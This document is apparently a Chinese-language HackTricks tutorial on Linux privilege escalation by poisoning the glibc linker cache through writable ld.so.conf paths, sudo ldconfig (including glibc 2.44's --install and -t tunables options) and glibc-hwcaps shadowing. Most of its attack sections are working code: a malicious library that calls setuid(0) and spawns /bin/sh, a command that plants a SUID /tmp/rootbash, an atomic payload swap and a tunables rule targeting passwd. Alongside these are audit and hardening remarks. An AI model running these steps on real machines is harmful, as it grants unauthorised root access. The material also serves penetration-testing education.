# ld.so privesc exploit 示例

{{#include ../../banners/hacktricks-training.md}}

此页面专门用于演示如何通过 `/etc/ld.so.conf` 或 `ldconfig` 污染 **system linker cache**。有关 missing-library injection、可写的 `RPATH`/`RUNPATH`、`LD_PRELOAD` 以及其他通用的 SUID linker abuse，请参阅 [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md)。

## 准备环境

以下部分包含用于准备环境的文件代码。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **创建**这些文件到你的机器上的同一文件夹中
2. **编译** **library**：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. 将 `libcustom.so` **复制**到 `/usr/lib` 并刷新缓存：`sudo cp libcustom.so /usr/lib && sudo ldconfig`（需要 root 权限）
4. **编译** **executable**：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

检查 _libcustom.so_ 是否从 _/usr/lib_ **加载**，并确认你可以**执行**该 binary。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 有用的 triage 命令

攻击真实目标时，请验证二进制文件所需的**确切库名称**、loader **当前正在解析的内容**，以及哪些已配置路径可写，同时不要修改正在使用的 cache。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
仅对**trusted**可执行文件使用 `ldd`。某些实现或异常的 ELF interpreter 可能导致其执行攻击者控制的代码；`objdump -p ./file | grep NEEDED` 可以安全地列出直接依赖项。对于 trusted target，使用发现的 interpreter 调用 `--list` 可以显示实际的解析结果。将该输出与 `--inhibit-cache --list` 的输出进行比较：如果存在差异，则证明是 `/etc/ld.so.cache` 选择了该 object，而不是普通的搜索路径规则。<sup>[[1]](#references)[[4]](#references)</sup>

以下是几个有用的注意事项：

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` 通常**不起作用**，因为
重定向由当前 shell 执行。应改用
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`。
- **SUID/privileged** binary 会以 **secure-execution mode** 运行：`LD_LIBRARY_PATH`
会被忽略，而 `LD_PRELOAD` 会受到限制（包含斜杠的名称会被忽略，只有位于标准目录中且设置了 setuid 标记的 library 才能被 preload）。root 运行 `ldconfig` 后，列在
`/etc/ld.so.conf` 中的目录可能会进入 `/etc/ld.so.cache`，因此这种错误配置仍可能影响 privileged program。<sup>[[1]](#references)[[2]](#references)</sup>
- 在 secure-execution mode 中，`LD_DEBUG` 同样会被忽略，除非存在 `/etc/suid-debug`；因此应从等效的 non-SUID 运行中收集其 trace，而不要期待 privileged execution 输出结果。<sup>[[1]](#references)</sup>
- 在 glibc 2.33 及更高版本中，dynamic loader 还提供了
`--list-diagnostics`，当 hijack 的行为不符合预期时，该选项会输出机器可读的 loader diagnostics 以及内置的搜索路径信息。<sup>[[1]](#references)[[6]](#references)</sup>

### Cache 和 SONAME 限制

`ldconfig` 不会缓存 configured directory 中的每个任意文件：它会检查 ELF headers，识别名称匹配 `lib*.so*` 或 `ld-*.so*` 的文件，并要求遵循常规的 `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` 链。因而，注入的 object 必须具有目标 architecture/class、准确的 `DT_NEEDED` 名称（通常是其 `DT_SONAME`），以及 victim 所解析的任何 symbols/versions。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
优先使用特定于目标的 library，例如此例。使用不完整的 object shadowing 常见 SONAME，可能会破坏每个在预期的 privileged target 运行前解析该 SONAME 的进程。<sup>[[3]](#references)</sup>

### 缓存路径持久化与原子替换

缓存记录的是 **library 名称到路径名** 的映射；它不会嵌入 shared object。攻击者控制的路径被缓存后，替换该确切路径上的 object，即可影响新启动的进程，而无需再次运行 `ldconfig`。这实现了一种实用的检查时机/使用时机（time-of-check/time-of-use）模式：在管理员重建或检查缓存期间提供一个有效的 library，然后通过原子重命名将 payload 覆盖到该路径上。现有进程会继续使用其已经映射的 object。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
同样，从 `ld.so.conf` 中删除恶意行本身并不会驱逐已经写入的条目：管理员必须移除不受信任的对象，修复所有权和写入权限，并重建 cache。使用上面的 `--inhibit-cache` 对比来区分过时的 cache 条目与仍处于活动状态的配置路径。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

在此场景中，假设管理员已将一个存在漏洞的条目添加到
`/etc/ld.so.conf.d/` 下的某个文件中，而系统的
`/etc/ld.so.conf` 会包含该文件。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
易受攻击的文件夹是 _/home/ubuntu/lib_（我们对此具有写入权限）。\
**下载并编译** 以下代码到该路径中：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
如果预计稍后会由 **root**（或其他特权账户）执行该易受攻击的 binary，通常最好留下一个由 **root** 所有的 **artifact**，而不是生成交互式 shell。例如：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
然后，在特权执行发生后，你可以使用 `/tmp/rootbash -p`。

现在，我们已经在配置错误的路径中**创建了恶意的 libcustom 库**，默认缓存必须通过一次成功的特权 **`ldconfig`** 运行来重建。只有在本地启动过程中确实会调用它的情况下，重启才会有所帮助；否则，请等待管理员执行相关操作，或在存在不安全的 sudo 规则时使用它。<sup>[[2]](#references)</sup>

完成后，**重新检查** `sharedvuln` 可执行文件从哪里加载 `libcustom.so` 库：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
正如你所见，它是从 **`/home/ubuntu/lib`** 加载的，如果任何用户执行它，将执行一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 请注意，在此示例中我们尚未提升权限，但通过修改执行的命令，并**等待 root 或其他特权用户执行存在漏洞的二进制文件**，我们就能提升权限。

### 现代 `glibc-hwcaps` shadowing

自 glibc 2.33 起，loader 可以优先使用位于**每个库搜索目录**内 `glibc-hwcaps/<level>/` 下的优化库。因此，仅检查 `/home/ubuntu/lib` 是不够的：例如 `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` 这样的可写兼容子目录，在 `ldconfig` 为其建立索引后，可能会 shadow 基础库，而其他 CPU 仍会使用基础对象。这还提供了一种按架构选择性劫持的方式，如果 validation 在另一台 CPU 上进行，就可能被遗漏。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
当前的 glibc hardening 指南建议避免重复的 SONAME、非默认搜索位置，以及 `glibc-hwcaps` 子目录中的对象。从审计角度来看，应递归检查已配置目录及其父路径组件的所有权和可写性。<sup>[[3]](#references)</sup>

### 其他错误配置 - 相同漏洞

在前面的示例中，我们伪造了一个错误配置：管理员**在 `/etc/ld.so.conf.d/` 中的配置文件里设置了一个非特权文件夹**。\
但还有其他错误配置可能导致相同的漏洞：如果你对已加载的**配置文件**具有**写权限**，可以在可写的 `/etc/ld.so.conf.d/` 目录中创建文件，或者可以写入 `/etc/ld.so.conf`，就可以配置并利用相同的漏洞。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**假设你对 `ldconfig` 具有 sudo 权限**。`ldconfig` 接受作为位置参数提供的扫描目录，因此最简短的 cache-poisoning 形式通常就是：<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
或者，`-f` 可在保留默认缓存输出的同时选择其他配置文件。当参数过滤器阻止位置目录但仍允许使用 `-f`，或必须注入多个路径时，这种方式很有用：<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，如**前一个 exploit**中所示，**在 `/tmp` 内创建恶意库**。\
最后，让我们加载该路径，并检查二进制文件从哪里加载该库：
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**正如你所看到的，拥有针对 `ldconfig` 的 sudo 权限同样可以利用这一漏洞。** 在评估受限 sudo 规则时，选项的具体行为很重要：`-f` 选择其他配置文件，但仍会重建 `/etc/ld.so.cache`；`-C` 将缓存重定向到其他位置；`-N` 阻止重建缓存；而 `-X` 阻止更新链接，但**除非与 `-N` 组合使用，否则仍会重建缓存**。`-n` 隐含 `-N`，因此它可以更新指定目录中的链接，但无法污染缓存；`-r` 在备用根目录下运行，通常不会修改主机缓存。<sup>[[2]](#references)</sup>

### glibc 2.44：安装预构建缓存

Glibc 2.44 新增了 `ldconfig --install SOURCE`，它会将预构建缓存以原子方式复制到所选的缓存目标位置（除非使用 `-C` 或 `-r` 更改，否则目标是主机的 `/etc/ld.so.cache`）。这为 sudoers 规则和特权 wrapper 带来了另一个危险参数：攻击者可以**在没有权限的情况下**构造有效缓存，然后使用被允许的 `--install` invocation 替换系统缓存。安装路径会检查缓存 magic，但不会根据受信任的配置重新生成其中的条目。<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
缓存中仍然包含的是**路径名**，而不是库的字节内容，因此受害者启动时，`/tmp/libcustom.so` 必须仍然存在且兼容。在 glibc 2.44 中，仅拒绝 `-f`、位置参数目录或 `-t` 的过滤器是不完整的：还必须拒绝 `--install`/`-I`，或者最好完全不要委托执行 `ldconfig`。<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44：缓存的系统级 tunables

从 glibc 2.44 开始，`ldconfig` 还会解析 `/etc/tunables.conf`，并将其设置作为扩展存储到 `/etc/ld.so.cache` 中。该文件接受 `include` 指令和 per-process filters。前缀控制作用范围：`@`/`onlysecure` 仅针对 `AT_SECURE` 进程，`$`/`nonsecure` 排除这些进程，而 `*`/`anysecure` 则涵盖两者。**不带前缀的条目默认针对非 secure 进程**，因此攻击者必须显式使用 `@` 或 `*`，才能影响 setuid、setgid 或 capability-elevated 程序。这使审计边界扩展到库目录之外：可写的 tunables 配置或其包含的文件，能够在特权 cache rebuild 后影响未来的程序启动。<sup>[[7]](#references)[[9]](#references)</sup>

同一版本新增了 `ldconfig -t TUNCONF`，该选项会选择备用的 tunables 文件，同时仍写入正常缓存，除非其他选项改变了这一行为。因此，试图仅阻止 `-f` 的 wrapper 和 sudo 规则还必须拒绝 `-t`、任意位置参数目录、`--install` 以及对缓存输出的操纵。<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### 目标选择性 tunables

`[proc:PATTERN]` 过滤器仅在可执行文件的完整 `/proc/self/exe` 路径（如果 `PATTERN` 以 `/` 开头）或 basename 匹配时应用以下条目。过滤器会在遇到下一个过滤器、`[]`、文件末尾或 include-file 边界时结束。这样可以降低 poisoned cache 的噪声，因为可以将改变后的行为限制在单个 privileged victim 上。<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
`-`/`nonoverridable` 前缀会阻止 `GLIBC_TUNABLES` 覆盖缓存值；`+`/`overridable` 则恢复正常的覆盖行为。对于 `AT_SECURE` 进程，环境变量无论如何都会被完全忽略。应将文件格式视为特定版本的格式——glibc 项目并未承诺将其作为稳定接口——并在尝试实现特定效果前，使用 `"$interp" --list-tunables` 列出受支持的名称和值。<sup>[[7]](#references)[[9]](#references)</sup>

这不会自动导致任意 code execution。这是一种特权的 **loader-behavior manipulation** primitive：glibc 明确警告，系统范围的值可能会将涉及安全性的 tunables 应用于 setuid/setgid 程序，而不会针对每个 tunable 进行单独的安全筛查。应寻找特定目标的 allocator 变化、CPU-hardening 变化或 denial-of-service 条件，而不是假定存在通用 payload。<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux 手册页](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [GNU C Library version 2.44 现已发布](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [glibc 2.44 ldconfig source](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
